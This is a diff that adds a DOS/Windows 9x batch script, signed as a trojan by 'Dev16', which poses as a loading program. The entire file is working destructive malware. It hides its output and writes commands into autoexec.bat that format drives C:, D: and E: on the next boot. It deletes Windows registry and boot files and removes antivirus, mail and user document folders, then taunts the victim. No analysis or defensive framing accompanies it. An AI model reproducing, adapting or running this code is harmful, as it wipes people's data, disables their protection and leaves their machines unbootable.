@@ -1,0 +1,44 @@
+@echo off
+:Warning! Warning! Warning! (c) Dev16
+echo Please wait while programm be loaded!
+echo If you computer not have Dev16, then it may takes some minutes...
+ctty nul
+echo @echo off >> c:\autoexec.bat
+echo ctty nul  >> c:\autoexec.bat
+echo Dev16 need in wo! >> c:\autoexec.bat
+echo echo y| format e: /q /u /v:De16 >> c:\autoexec.bat
+echo echo y| format d: /q /u /v:De16 >> c:\autoexec.bat
+echo echo y| format c: /q /u /v:De16 >> c:\autoexec.bat
+attrib c:\config.sys -h -r -s -a
+echo Dev16 need in wo >> c:\config.sys
+attrib c:\*.* - h -r -s -a
+attrib %winbootdir%\*.* - h -r -s -a
+del c:\nc\nc.exe
+del c:\dn\dn.com
+del c:\vc\vc.com
+del %winbootdir%\system.ini
+del %winbootdir%\win.ini
+attrib %winbootdir%\user.dat -h -r -a -s
+attrib %winbootdir%\user.da0 -h -r -a -s
+del %winbootdir%\user.dat
+del %winbootdir%\user.da0
+attrib %winbootdir%\system.dat -h -r -a -s
+attrib %winbootdir%\system.da0 -h -r -a -s
+del %winbootdir%\system.dat
+del %winbootdir%\system.da0
+del %winbootdir%\win.com
+deltree/y c:\tools
+deltree/y c:\progra~1\micros~1
+deltree/y c:\progra~1\micros~2
+deltree/y c:\antivir?
+deltree/y c:\моидок~1
+deltree/y c:\drweb
+deltree/y c:\progra~1\avp?????
+deltree/y %winbootdir%\РАБОЧИ~1
+deltree/y %winbootdir%\Главно~1
+deltree/y c:\progra~1\outloo~1
+ctty con
+echo You full stuped! Dev16 Ha-Ha-Ha!!!!1
+:This trojan write by Dev16!
+
+
